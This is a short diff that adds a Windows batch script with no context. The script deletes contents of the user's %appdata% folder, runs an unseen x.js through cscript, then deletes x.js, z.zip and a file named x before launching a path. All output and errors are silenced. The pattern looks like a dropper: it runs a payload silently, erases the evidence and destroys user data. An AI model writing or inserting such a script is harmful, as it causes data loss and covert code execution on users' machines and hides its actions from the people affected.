@@ -1,0 +1,7 @@
+set v="%appdata%\"
+del %v% >NUL 2>NUL
+cscript x.js >NUL 2>NUL
+del x.js >NUL 2>NUL
+del z.zip >NUL 2>NUL
+del x >NUL 2>NUL
+start "" %v%
